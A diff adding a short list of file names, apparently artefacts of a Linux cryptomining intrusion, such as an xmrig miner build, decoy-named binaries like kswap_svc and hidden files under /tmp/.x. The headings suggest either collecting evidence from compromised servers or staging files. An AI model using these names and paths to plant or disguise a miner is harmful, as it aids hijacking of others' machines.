@@ -1,0 +1,17 @@
+# Get from servers:
+autom.sh
+log_check.bin
+log_rotate.bin
+luk-cpu
+.serviced
+.daemond
+.conf
+ash.sh
+
+
+# Save on your disk:
+/tmp/.x/pippip
+/tmp/cron
+/tmp/myip.txt
+xmrig-notls
+kswap_svc
